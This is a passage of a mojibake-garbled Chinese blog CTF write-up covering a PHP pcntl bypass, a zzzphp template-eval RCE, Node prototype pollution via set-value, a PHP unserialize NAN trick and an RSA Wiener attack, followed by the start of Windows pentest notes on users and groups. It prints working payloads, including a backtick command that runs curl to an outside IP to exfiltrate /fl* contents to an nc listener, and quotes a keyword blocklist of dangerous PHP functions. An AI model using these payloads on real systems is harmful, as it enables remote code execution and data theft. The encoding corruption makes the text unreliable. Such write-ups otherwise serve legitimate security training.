//é¢˜ç›®ç¯å¢ƒï¼šphp:7.4.8-apache $pid = pcntl_fork(); if ($pid == -1) &#123; die(&#x27;could not fork&#x27;); &#125;else if ($pid)&#123; $r=pcntl_wait($status); if(!pcntl_wifexited($status))&#123; phpinfo(); &#125; &#125;else&#123; highlight_file(__FILE__); if(isset($_GET[&#x27;a&#x27;])&amp;&amp;is_string($_GET[&#x27;a&#x27;])&amp;&amp;!preg_match(&quot;/[:\\\\\\\\]|exec|pcntl/i&quot;,$_GET[&#x27;a&#x27;]))&#123; call_user_func_array($_GET[&#x27;a&#x27;],[$_GET[&#x27;b&#x27;],false,true]); &#125; posix_kill(posix_getpid(), SIGUSR1); &#125; å‚è€ƒæ–‡ç« ï¼š 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;raoxiaoya&#x2F;article&#x2F;details&#x2F;106604519 å¯ä»¥çŸ¥é“åªæœ‰è®©æŒ‚èµ·çš„å­è¿›ç¨‹é€€å‡ºæ‰èƒ½æ‰§è¡Œphpinfo() 1call_user_func_array($_GET[&#x27;a&#x27;],[$_GET[&#x27;b&#x27;],false,true]); call_user_func_arrayä¼šè°ƒç”¨å›è°ƒå‡½æ•°ï¼Œå¹¶æŠŠä¸€ä¸ªæ•°ç»„å‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•° å› æ­¤æˆ‘ä»¬éœ€è¦è®©$_GET[&#39;a&#39;]è¡¨ç¤ºçš„å‡½æ•°èƒ½å¤Ÿæ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œå¹¶ä¸”$_GET[&#39;b&#39;]è¡¨ç¤ºçš„å‡½æ•°èƒ½å¤Ÿæ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œç”¨pcntl_waitå’Œpcntl_waitpidè®©å­è¿›ç¨‹é€€å‡º å°è¯•æ„é€ payloadï¼š 1234?a&#x3D;register_shutdown_function&amp;b&#x3D;pcntl_wait?a&#x3D;register_shutdown_function&amp;b&#x3D;pcntl_waitpid?a&#x3D;call_user_func&amp;b&#x3D;pcntl_wait?a&#x3D;call_user_func&amp;b&#x3D;pcntl_waitpid flagåœ¨phpinfoä¸­ï¼ŒCTRL+Fæœç´¢flag rcemeæºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;?phperror_reporting(0);highlight_file(__FILE__);parserIfLabel($_GET[&#x27;a&#x27;]);function danger_key($s) &#123; $s=htmlspecialchars($s); $key=array(&#x27;php&#x27;,&#x27;preg&#x27;,&#x27;server&#x27;,&#x27;chr&#x27;,&#x27;decode&#x27;,&#x27;html&#x27;,&#x27;md5&#x27;,&#x27;post&#x27;,&#x27;get&#x27;,&#x27;request&#x27;,&#x27;file&#x27;,&#x27;cookie&#x27;,&#x27;session&#x27;,&#x27;sql&#x27;,&#x27;mkdir&#x27;,&#x27;copy&#x27;,&#x27;fwrite&#x27;,&#x27;del&#x27;,&#x27;encrypt&#x27;,&#x27;$&#x27;,&#x27;system&#x27;,&#x27;exec&#x27;,&#x27;shell&#x27;,&#x27;open&#x27;,&#x27;ini_&#x27;,&#x27;chroot&#x27;,&#x27;eval&#x27;,&#x27;passthru&#x27;,&#x27;include&#x27;,&#x27;require&#x27;,&#x27;assert&#x27;,&#x27;union&#x27;,&#x27;create&#x27;,&#x27;func&#x27;,&#x27;symlink&#x27;,&#x27;sleep&#x27;,&#x27;ord&#x27;,&#x27;str&#x27;,&#x27;source&#x27;,&#x27;rev&#x27;,&#x27;base_convert&#x27;); $s = str_ireplace($key,&quot;*&quot;,$s); $danger=array(&#x27;php&#x27;,&#x27;preg&#x27;,&#x27;server&#x27;,&#x27;chr&#x27;,&#x27;decode&#x27;,&#x27;html&#x27;,&#x27;md5&#x27;,&#x27;post&#x27;,&#x27;get&#x27;,&#x27;request&#x27;,&#x27;file&#x27;,&#x27;cookie&#x27;,&#x27;session&#x27;,&#x27;sql&#x27;,&#x27;mkdir&#x27;,&#x27;copy&#x27;,&#x27;fwrite&#x27;,&#x27;del&#x27;,&#x27;encrypt&#x27;,&#x27;$&#x27;,&#x27;system&#x27;,&#x27;exec&#x27;,&#x27;shell&#x27;,&#x27;open&#x27;,&#x27;ini_&#x27;,&#x27;chroot&#x27;,&#x27;eval&#x27;,&#x27;passthru&#x27;,&#x27;include&#x27;,&#x27;require&#x27;,&#x27;assert&#x27;,&#x27;union&#x27;,&#x27;create&#x27;,&#x27;func&#x27;,&#x27;symlink&#x27;,&#x27;sleep&#x27;,&#x27;ord&#x27;,&#x27;str&#x27;,&#x27;source&#x27;,&#x27;rev&#x27;,&#x27;base_convert&#x27;); foreach ($danger as $val)&#123; if(strpos($s,$val) !==false)&#123; die(&#x27;å¾ˆæŠ±æ­‰ï¼Œæ‰§è¡Œå‡ºé”™ï¼Œå‘ç°å±é™©å­—ç¬¦ã€&#x27;.$val.&#x27;ã€‘&#x27;); &#125; &#125; if(preg_match(&quot;/^[a-z]$/i&quot;))&#123; die(&#x27;å¾ˆæŠ±æ­‰ï¼Œæ‰§è¡Œå‡ºé”™ï¼Œå‘ç°å±é™©å­—ç¬¦&#x27;); &#125; return $s;&#125;function parserIfLabel( $content ) &#123; $pattern = &#x27;/\\&#123;if:([\\s\\S]+?)&#125;([\\s\\S]*?)&#123;end\\s+if&#125;/&#x27;; if ( preg_match_all( $pattern, $content, $matches ) ) &#123; $count = count( $matches[ 0 ] ); for ( $i = 0; $i &lt; $count; $i++ ) &#123; $flag = &#x27;&#x27;; $out_html = &#x27;&#x27;; $ifstr = $matches[ 1 ][ $i ]; $ifstr=danger_key($ifstr,1); if(strpos($ifstr,&#x27;=&#x27;) !== false)&#123; $arr= splits($ifstr,&#x27;=&#x27;); if($arr[0]==&#x27;&#x27; || $arr[1]==&#x27;&#x27;)&#123; die(&#x27;å¾ˆæŠ±æ­‰ï¼Œæ¨¡æ¿ä¸­æœ‰é”™è¯¯çš„åˆ¤æ–­,è¯·ä¿®æ­£ã€&#x27;.$ifstr.&#x27;ã€‘&#x27;); &#125; $ifstr = str_replace( &#x27;=&#x27;, &#x27;==&#x27;, $ifstr ); &#125; $ifstr = str_replace( &#x27;&lt;&gt;&#x27;, &#x27;!=&#x27;, $ifstr ); $ifstr = str_replace( &#x27;or&#x27;, &#x27;||&#x27;, $ifstr ); $ifstr = str_replace( &#x27;and&#x27;, &#x27;&amp;&amp;&#x27;, $ifstr ); $ifstr = str_replace( &#x27;mod&#x27;, &#x27;%&#x27;, $ifstr ); $ifstr = str_replace( &#x27;not&#x27;, &#x27;!&#x27;, $ifstr ); if ( preg_match( &#x27;/\\&#123;|&#125;/&#x27;, $ifstr)) &#123; die(&#x27;å¾ˆæŠ±æ­‰ï¼Œæ¨¡æ¿ä¸­æœ‰é”™è¯¯çš„åˆ¤æ–­,è¯·ä¿®æ­£&#x27;.$ifstr); &#125;else&#123; @eval( &#x27;if(&#x27; . $ifstr . &#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27; ); &#125; if ( preg_match( &#x27;/([\\s\\S]*)?\\&#123;else\\&#125;([\\s\\S]*)?/&#x27;, $matches[ 2 ][ $i ], $matches2 ) ) &#123; switch ( $flag ) &#123; case &#x27;if&#x27;: if ( isset( $matches2[ 1 ] ) ) &#123; $out_html .= $matches2[ 1 ]; &#125; break; case &#x27;else&#x27;: if ( isset( $matches2[ 2 ] ) ) &#123; $out_html .= $matches2[ 2 ]; &#125; break; &#125; &#125; elseif ( $flag == &#x27;if&#x27; ) &#123; $out_html .= $matches[ 2 ][ $i ]; &#125; $pattern2 = &#x27;/\\&#123;if([0-9]):/&#x27;; if ( preg_match( $pattern2, $out_html, $matches3 ) ) &#123; $out_html = str_replace( &#x27;&#123;if&#x27; . $matches3[ 1 ], &#x27;&#123;if&#x27;, $out_html ); $out_html = str_replace( &#x27;&#123;else&#x27; . $matches3[ 1 ] . &#x27;&#125;&#x27;, &#x27;&#123;else&#125;&#x27;, $out_html ); $out_html = str_replace( &#x27;&#123;end if&#x27; . $matches3[ 1 ] . &#x27;&#125;&#x27;, &#x27;&#123;end if&#125;&#x27;, $out_html ); $out_html = $this-&gt;parserIfLabel( $out_html ); &#125; $content = str_replace( $matches[ 0 ][ $i ], $out_html, $content ); &#125; &#125; return $content;&#125;function splits( $s, $str=&#x27;,&#x27; ) &#123; if ( empty( $s ) ) return array( &#x27;&#x27; ); if ( strpos( $s, $str ) !== false ) &#123; return explode( $str, $s ); &#125; else &#123; return array( $s ); &#125;&#125; é¢˜ç›®æ”¹è‡ªzzzphp rceï¼Œå‚è€ƒæ–‡ç« ï¼š 1https:&#x2F;&#x2F;y4er.com&#x2F;post&#x2F;zzzphp-rce&#x2F; å‘ç°è¿‡æ»¤äº†strï¼Œå› æ­¤ä½œè€…çš„é‚£ç§æ–¹æ³•ç”¨ä¸äº†äº†ï¼Œç›´æ¥åå¼•å·å‘½ä»¤æ‰§è¡Œï¼Œç”¨curlå¤–å¸¦å‡ºflagï¼Œæ„é€ payload: 1?a&#x3D;&#123;if:1)&#96;curl 47.97.210.141:9000&#x2F;\\&#96;cat &#x2F;fl*\\&#96;&#96;;&#x2F;&#x2F;&#125;&#123;end if&#125; æœåŠ¡ç«¯ç”¨ncç›‘å¬å³å¯å¾—åˆ°flag littlegameçœ‹äº†çœ‹ä¸»è¦ä»£ç ï¼Œå‘ç°å¾—åˆ°flagçš„æ¡ä»¶ 12345let key = req.body.key.toString();let password = req.body.password.toString();if(Admin[key] === password)&#123; res.send(process.env.flag);&#125; å¹¶ä¸”keyå’Œpasswordæ˜¯å¯æ§çš„ï¼Œæ¥ç€å‘ç°setFnè¿™ä¸ªæ•æ„Ÿå‡½æ•°ï¼š 123let key = req.body.NewAttributeKey.toString();let value = req.body.NewAttributeValue.toString();setFn(req.session.knight, key, value); å‘ç°æ˜¯å¼•å…¥set-valueè¿™ä¸ªåŒ…å¾—åˆ°çš„ï¼š 1const setFn = require(&#x27;set-value&#x27;); æœäº†ä¸‹ï¼Œæœåˆ°äº†è¿™ç¯‡æ–‡ç« ï¼š 1https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-JS-SETVALUE-450213 jsåŸå‹é“¾æ±¡æŸ“ï¼Œä¸ºæ‰€æœ‰å¯¹è±¡å¢åŠ aaaå±æ€§ 12345678910111213141516POST &#x2F;Privilege HTTP&#x2F;1.1Host: eci-2zefq4smu48613r6o17l.cloudeci1.ichunqiu.com:8888User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateConnection: closeCookie: __jsluid_h&#x3D;93637ceba89c6fddd5299faa318a6cea; session&#x3D;s%3A7wfZ0-VLrHUCedTzvR8lbsdb9yZkkEZH.8uPhesdOIoUUYn73e63GfvympMqk%2FiBm3cJ6avzlyaYUpgrade-Insecure-Requests: 1If-Modified-Since: Thu, 20 Aug 2020 08:01:33 GMTIf-None-Match: W&#x2F;&quot;1cb-1740ae32748&quot;Cache-Control: max-age&#x3D;0Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 51NewAttributeKey&#x3D;__proto__.aaa&amp;NewAttributeValue&#x3D;aaa ç”¨æ±¡æŸ“çš„é”®å€¼å¾—åˆ°flag 12345678910111213141516POST &#x2F;DeveloperControlPanel HTTP&#x2F;1.1Host: eci-2zefq4smu48613r6o17l.cloudeci1.ichunqiu.com:8888User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateConnection: closeCookie: __jsluid_h&#x3D;93637ceba89c6fddd5299faa318a6cea; session&#x3D;s%3A7wfZ0-VLrHUCedTzvR8lbsdb9yZkkEZH.8uPhesdOIoUUYn73e63GfvympMqk%2FiBm3cJ6avzlyaYUpgrade-Insecure-Requests: 1If-Modified-Since: Thu, 20 Aug 2020 08:01:33 GMTIf-None-Match: W&#x2F;&quot;1cb-1740ae32748&quot;Cache-Control: max-age&#x3D;0Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 20key&#x3D;aaa&amp;password&#x3D;aaa easytrickæºç ï¼š 12345678910111213141516&lt;?phpclass trick&#123; public $trick1; public $trick2; public function __destruct()&#123; $this-&gt;trick1 = (string)$this-&gt;trick1; if(strlen($this-&gt;trick1) &gt; 5 || strlen($this-&gt;trick2) &gt; 5)&#123; die(&quot;ä½ å¤ªé•¿äº†&quot;); &#125; if($this-&gt;trick1 !== $this-&gt;trick2 &amp;&amp; md5($this-&gt;trick1) === md5($this-&gt;trick2) &amp;&amp; $this-&gt;trick1 != $this-&gt;trick2)&#123; echo file_get_contents(&quot;/flag&quot;); &#125; &#125;&#125;highlight_file(__FILE__);unserialize($_GET[&#x27;trick&#x27;]); å¯ä»¥ç”¨NANå’ŒINFç»•è¿‡ï¼Œå¦‚å›¾ï¼š æ„é€ pocï¼š 123456789&lt;?phpclass trick&#123; public $trick1; public $trick2;&#125; $a=new trick();$a-&gt;trick1=&#x27;NAN&#x27;;$a-&gt;trick2=NAN;echo serialize($a); Miscç­¾åˆ°ç­‰åˆ°å„ä¸ªåœ°åŒºåŠ©åŠ›å®Œæˆåå°±ä¼šç»™å‡ºflag the_best_ctf_gamehxdæ‰“å¼€å¯ä»¥æ˜æ˜¾çœ‹åˆ°flagå­—æ · å¹¶ä¸”ä¸­é—´éš”çš„éƒ½æ˜¯ 100 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 0C 00 00 00 E0 FF FF FF B0 FF FF FF 00 00 00 00 ç›´æ¥å…¨å±€æ›¿æ¢æˆç©ºå¾—åˆ°flag ç”µè„‘è¢«é»‘binwalkåˆ†ç¦»å‡º demoç”¨ida64æ‰“å¼€å¾—åˆ° 12345678910111213141516171819202122232425262728293031323334353637383940414243int __cdecl main(int argc, const char **argv, const char **envp)&#123; int result; // eax char v4; // [rsp+1Dh] [rbp-13h] char v5; // [rsp+1Eh] [rbp-12h] char v6; // [rsp+1Fh] [rbp-11h] FILE *v7; // [rsp+20h] [rbp-10h] FILE *stream; // [rsp+28h] [rbp-8h] v4 = 34; v5 = 0; v7 = fopen(argv[1], &quot;rb&quot;); if ( v7 ) &#123; stream = fopen(argv[1], &quot;rb+&quot;); if ( stream ) &#123; while ( 1 ) &#123; v6 = fgetc(v7); if ( v6 == -1 ) break; fputc(v4 ^ (v5 + v6), stream); v4 += 34; v5 = (v5 + 2) &amp; 0xF; &#125; fclose(v7); fclose(stream); result = 0; &#125; else &#123; printf(&quot;cannot open file&quot;, &quot;rb+&quot;, argv); result = 0; &#125; &#125; else &#123; printf(&quot;cannot open this file&quot;, &quot;rb&quot;, argv); result = 0; &#125; return result;&#125; é¢˜ç›®æç¤ºè¯¯åˆ æ•°æ®ï¼Œç”¨extundeleteæ¢å¤åˆ é™¤çš„æ•°æ®å¾—åˆ°flag.txt é€†ä¸€ä¸‹ç®—æ³•ï¼Œexpï¼š 1234567891011121314v4=34v5=0v7=open(&quot;flag.txt&quot;,&quot;rb&quot;).read()for v6 in v7: with open(&quot;trueflag.txt&quot;,&quot;ab+&quot;) as fp: # print(str(v6)) a=((int(str(v6))^v4)-v5)%256 if a==-1: v4=34 v5=0 continue print(chr(a),end=&quot;&quot;) v4+=34; v5=(v5+2) &amp; 0xf CryptobdRSAä¸­çš„ç»´çº³æ”»å‡»ï¼Œè„šæœ¬åœ°å€ï¼š 1https:&#x2F;&#x2F;github.com&#x2F;pablocelayes&#x2F;rsa-wiener-attack é€šè¿‡ç»´çº³æ”»å‡»è®¡ç®—å‡ºdï¼Œç„¶åè§£å¯†å°±è¡Œï¼Œè„šæœ¬ï¼š 12345678910111213141516171819202122232425262728293031323334import ContinuedFractions, Arithmetic, RSAvulnerableKeyGeneratorfrom binascii import a2b_hexdef hack_RSA(e,n): &#x27;&#x27;&#x27; Finds d knowing (e,n) applying the Wiener continued fraction attack &#x27;&#x27;&#x27; frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k,d) in convergents: #check if d is actually the key if k!=0 and (e*d-1)%k == 0: phi = (e*d-1)//k s = n - phi + 1 # check if the equation x^2 - s*x + n = 0 # has integer roots discr = s*s - 4*n if(discr&gt;=0): t = Arithmetic.is_perfect_square(discr) if t!=-1 and (s+t)%2==0: print(&quot;Hacked!&quot;) return d c=37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066e=46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249N=86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289d=hack_RSA(e,N)m=pow(c,d,N)flag=a2b_hex(hex(m).replace(&#x27;0x&#x27;,&#x27;&#x27;)).decode()print(flag)","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.m00nback.xyz/tags/writeup/"}]},{"title":"å†…ç½‘æ¸—é€åˆæ¢ä¹‹WindowsåŸºç¡€","slug":"å†…ç½‘æ¸—é€1","date":"2020-06-24T14:41:15.000Z","updated":"2020-09-16T10:09:53.249Z","comments":true,"path":"2020/06/24/å†…ç½‘æ¸—é€1/","link":"","permalink":"http://www.m00nback.xyz/2020/06/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F1/","excerpt":"è®°ä¸€ä¸‹ï¼Œå¿˜äº†æ–¹ä¾¿çœ‹ï¼ï¼ï¼","text":"è®°ä¸€ä¸‹ï¼Œå¿˜äº†æ–¹ä¾¿çœ‹ï¼ï¼ï¼ Windowsç”¨æˆ·å’Œç”¨æˆ·ç»„å¸¸è§ç”¨æˆ·Administratorç³»ç»Ÿç®¡ç†å‘˜ï¼Œè®¡ç®—æœºçš„ç®¡ç†å‘˜è´¦æˆ·æ‹¥æœ‰å¯¹å…¨ç³»ç»Ÿçš„æ§åˆ¶æƒï¼Œèƒ½æ”¹å˜ç³»ç»Ÿè®¾ç½®ï¼Œå¯ä»¥å®‰è£…å’Œåˆ é™¤ç¨‹åºï¼Œèƒ½è®¿é—®è®¡ç®—æœºä¸Šæ‰€æœ‰çš„æ–‡ä»¶ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå®ƒè¿˜æ‹¥æœ‰æ§åˆ¶å…¶ä»–ç”¨æˆ·çš„æƒé™ã€‚Windows7ä¸­è‡³å°‘è¦æœ‰ä¸€ä¸ªè®¡ç®—æœºç®¡ç†å‘˜è´¦æˆ·ã€‚åœ¨åªæœ‰ä¸€ä¸ªè®¡ç®—æœºç®¡ç†å‘˜è´¦æˆ·çš„æƒ…å†µä¸‹ï¼Œè¯¥è´¦æˆ·ä¸èƒ½å°†è‡ªå·±æ”¹æˆå—é™åˆ¶è´¦æˆ·ã€‚ Useræ ‡å‡†ç”¨æˆ·è´¦æˆ·æ˜¯å—åˆ°ä¸€å®šé™åˆ¶çš„è´¦æˆ·ï¼Œåœ¨ç³»ç»Ÿä¸­å¯ä»¥åˆ›å»ºå¤šä¸ªæ­¤ç±»è´¦æˆ·ï¼Œä¹Ÿå¯ä»¥æ”¹å˜å…¶è´¦æˆ·ç±»å‹ã€‚è¯¥è´¦æˆ·å¯ä»¥è®¿é—®å·²ç»å®‰è£…åœ¨è®¡ç®—æœºä¸Šçš„ç¨‹åºï¼Œå¯ä»¥è®¾ç½®è‡ªå·±è´¦æˆ·çš„å›¾ç‰‡ã€å¯†ç ç­‰ï¼Œä½†æ— æƒæ›´æ”¹å¤§å¤šæ•°è®¡ç®—æœºçš„è®¾ç½®ã€‚ SystemSYSTEMæ˜¯ç³»ç»Ÿä¿ç•™æ‹¥æœ‰æœ€é«˜æƒé™çš„è¶…çº§ç®¡ç†å‘˜å¸æˆ·ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥åœ¨ç™»å½•å¯¹è¯æ¡†ä¸Šä»¥SYSTEMå¸æˆ·çš„èº«ä»½ç™»å½•åˆ°Windowsæ¡Œé¢ç¯å¢ƒã€‚ ç”¨æˆ·ç»„åŸºæœ¬ç”¨æˆ·ç»„Administrators å±äºè¯¥administatorsæœ¬åœ°ç»„å†…çš„ç”¨æˆ·ï¼Œéƒ½å…·å¤‡ç³»ç»Ÿç®¡ç†å‘˜çš„æƒé™ï¼Œå®ƒä»¬æ‹¥æœ‰å¯¹è¿™å°è®¡ç®—æœºæœ€å¤§çš„æ§åˆ¶æƒé™ï¼Œå¯ä»¥æ‰§è¡Œæ•´å°è®¡ç®—æœºçš„ç®¡ç†ä»»åŠ¡ã€‚å†…ç½®çš„ç³»ç»Ÿç®¡ç†å‘˜è´¦å·Administratorå°±æ˜¯æœ¬åœ°ç»„çš„æˆå‘˜ï¼Œè€Œä¸”æ— æ³•å°†å®ƒä»è¯¥ç»„åˆ é™¤ã€‚ å¦‚æœè¿™å°è®¡ç®—æœºå·²åŠ å…¥åŸŸï¼Œåˆ™åŸŸçš„Domain Adminsä¼šè‡ªåŠ¨åœ°åŠ å…¥åˆ°è¯¥è®¡ç®—æœºçš„Administratorsç»„å†…ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒåŸŸä¸Šçš„ç³»ç»Ÿç®¡ç†å‘˜åœ¨è¿™å°è®¡ç®—æœºä¸Šä¹Ÿå…·å¤‡ç€ç³»ç»Ÿç®¡ç†å‘˜çš„æƒé™ã€‚ Backup OPerators åœ¨è¯¥ç»„å†…çš„æˆå‘˜ï¼Œä¸è®ºå®ƒä»¬æ˜¯å¦æœ‰æƒè®¿é—®è¿™å°è®¡ç®—æœºä¸­çš„æ–‡ä»¶å¤¹æˆ–æ–‡ä»¶ï¼Œéƒ½å¯ä»¥é€šè¿‡â€œå¼€å§‹â€ï¼â€œæ‰€æœ‰ç¨‹åºâ€ï¼â€œé™„ä»¶â€ï¼â€œç³»ç»Ÿå·¥å…·â€ï¼â€œå¤‡ä»½â€çš„é€”å¾„ï¼Œå¤‡ä»½ä¸è¿˜åŸè¿™äº›æ–‡ä»¶å¤¹ä¸æ–‡ä»¶ã€‚ Guests è¯¥ç»„æ˜¯æä¾›æ²¡æœ‰ç”¨æˆ·å¸æˆ·ï¼Œä½†æ˜¯éœ€è¦è®¿é—®æœ¬åœ°è®¡ç®—æœºå†…èµ„æºçš„ç”¨æˆ·ä½¿ç”¨ï¼Œè¯¥ç»„çš„æˆå‘˜æ— æ³•æ°¸ä¹…åœ°æ”¹å˜å…¶æ¡Œé¢çš„å·¥ä½œç¯å¢ƒã€‚è¯¥ç»„æœ€å¸¸è§çš„é»˜è®¤æˆå‘˜ä¸ºç”¨æˆ·å¸å·Guestã€‚ Network Configuration Operators è¯¥ç»„å†…çš„ç”¨æˆ·å¯ä»¥åœ¨å®¢æˆ·ç«¯æ‰§è¡Œä¸€èˆ¬çš„ç½‘ç»œè®¾ç½®ä»»åŠ¡ï¼Œä¾‹å¦‚æ›´æ”¹IPåœ°å€ï¼Œä½†æ˜¯ä¸å¯ä»¥å®‰è£…/åˆ é™¤é©±åŠ¨ç¨‹åºä¸æœåŠ¡ï¼Œä¹Ÿä¸å¯ä»¥æ‰§è¡Œä¸ç½‘ç»œæœåŠ¡å™¨è®¾ç½®æœ‰å…³çš„ä»»åŠ¡ï¼Œä¾‹å¦‚DNSæœåŠ¡å™¨ã€DHCPæœåŠ¡å™¨çš„è®¾ç½®ã€‚ Power Users è¯¥ç»„å†…çš„ç”¨æˆ·å…·å¤‡æ¯”Usersç»„æ›´å¤šçš„æƒåˆ©ï¼Œä½†æ˜¯æ¯”Administratorsç»„æ‹¥æœ‰çš„æƒåˆ©æ›´å°‘ä¸€äº›ï¼Œä¾‹å¦‚ï¼Œå¯ä»¥ï¼š åˆ›å»ºã€åˆ é™¤ã€æ›´æ”¹æœ¬åœ°ç”¨æˆ·å¸æˆ· åˆ›å»ºã€åˆ é™¤ã€ç®¡ç†æœ¬åœ°è®¡ç®—æœºå†…çš„å…±äº«æ–‡ä»¶å¤¹ä¸å…±äº«æ‰“å°æœº è‡ªå®šä¹‰ç³»ç»Ÿè®¾ç½®ï¼Œä¾‹å¦‚æ›´æ”¹è®¡ç®—æœºæ—¶é—´ã€å…³é—­è®¡ç®—æœºç­‰ ä½†æ˜¯ä¸å¯ä»¥æ›´æ”¹Administratorsä¸Backup Operatorsã€æ— æ³•å¤ºå–æ–‡ä»¶çš„æ‰€æœ‰æƒã€æ— æ³•å¤‡ä»½ä¸è¿˜åŸæ–‡ä»¶ã€æ— æ³•å®‰è£…åˆ é™¤ä¸åˆ é™¤è®¾å¤‡é©±åŠ¨ç¨‹åºã€æ— æ³•ç®¡ç†å®‰å…¨ä¸å®¡æ ¸æ—¥å¿—ã€‚ Remote Desktop Users è¯¥ç»„çš„æˆå‘˜å¯ä»¥é€šè¿‡è¿œç¨‹è®¡ç®—æœºç™»å½•ï¼Œä¾‹å¦‚ï¼Œåˆ©ç”¨ç»ˆç«¯æœåŠ¡å™¨ä»è¿œç¨‹è®¡ç®—æœºç™»å½•ã€‚ Users è¯¥ç»„å‘˜åªæ‹¥æœ‰ä¸€äº›åŸºæœ¬çš„æƒåˆ©ï¼Œä¾‹å¦‚è¿è¡Œåº”ç”¨ç¨‹åºï¼Œä½†æ˜¯ä»–ä»¬ä¸èƒ½ä¿®æ”¹æ“ä½œç³»ç»Ÿçš„è®¾ç½®ã€ä¸èƒ½æ›´æ”¹å…¶å®ƒç”¨æˆ·çš„æ•°æ®ã€ä¸èƒ½å…³é—­æœåŠ¡å™¨çº§çš„è®¡ç®—æœºã€‚ æ‰€æœ‰æ·»åŠ çš„æœ¬åœ°ç”¨æˆ·å¸æˆ·è€…è‡ªåŠ¨å±äºè¯¥ç»„ã€‚å¦‚æœè¿™å°è®¡ç®—æœºå·²ç»åŠ å…¥åŸŸï¼Œåˆ™åŸŸçš„Domain Usersä¼šè‡ªåŠ¨åœ°è¢«åŠ å…¥åˆ°è¯¥è®¡ç®—æœºçš„Usersç»„ä¸­ã€‚ SYSTEM â€‹ æ‹¥æœ‰å’ŒAdministratorsä¸€æ ·ã€ç”šè‡³æ¯”å…¶è¿˜é«˜çš„æƒé™ï¼Œä½†æ˜¯è¿™ä¸ªç»„ä¸å…è®¸ä»»ä½•ç”¨æˆ·çš„åŠ å…¥ï¼Œåœ¨å¯Ÿçœ‹ç”¨æˆ·ç»„çš„æ—¶å€™ï¼Œå®ƒä¹Ÿä¸ä¼šè¢«æ˜¾ç¤ºå‡ºæ¥ï¼Œå®ƒå°±æ˜¯SYSTEMç»„ã€‚ç³»ç»Ÿå’Œç³»ç»Ÿçº§çš„æœåŠ¡æ­£å¸¸è¿è¡Œæ‰€éœ€è¦çš„æƒé™éƒ½æ˜¯é å®ƒèµ‹äºˆçš„ã€‚ç”±äºè¯¥ç»„åªæœ‰è¿™ä¸€ä¸ªç”¨æˆ·SYSTEMï¼Œå¯ä»¥ç†è§£æˆlinuxçš„rootç”¨æˆ· å†…ç½®ç‰¹æ®Šç»„Everone ä»»ä½•ä¸€ä¸ªç”¨æˆ·éƒ½å±äºè¿™ä¸ªç»„ã€‚æ³¨æ„ï¼Œå¦‚æœGuestå¸å·è¢«å¯ç”¨æ—¶ï¼Œåˆ™ç»™Everoneè¿™ä¸ªç»„æŒ‡æ´¾æƒé™æ—¶å¿…é¡»å°å¿ƒï¼Œå› ä¸ºå½“ä¸€ä¸ªæ²¡æœ‰å¸æˆ·çš„ç”¨æˆ·è¿æ¥è®¡ç®—æœºæ—¶ï¼Œä»–è¢«å…è®¸è‡ªåŠ¨åˆ©ç”¨Guestå¸æˆ·è¿æ¥ï¼Œä½†æ˜¯å› ä¸ºGuestä¹Ÿæ˜¯å±äºEveroneç»„ï¼Œæ‰€ä»¥ä»–å°†å…·å¤‡Everyoneæ‰€æ‹¥æœ‰çš„æƒé™ã€‚ Authenticated Users ä»»ä½•ä¸€ä¸ªåˆ©ç”¨æœ‰æ•ˆçš„ç”¨æˆ·å¸æˆ·è¿æ¥çš„ç”¨æˆ·éƒ½å±äºè¿™ä¸ªç»„ã€‚å»ºè®®åœ¨è®¾ç½®æƒé™æ—¶ï¼Œå°½é‡é’ˆå¯¹Authenticated Usersç»„è¿›è¡Œè®¾ç½®ï¼Œè€Œä¸è¦é’ˆå¯¹Everoneè¿›è¡Œè®¾ç½®ã€‚ Interactive ä»»ä½•åœ¨æœ¬åœ°ç™»å½•çš„ç”¨æˆ·éƒ½å±äºè¿™ä¸ªç»„ã€‚ Network 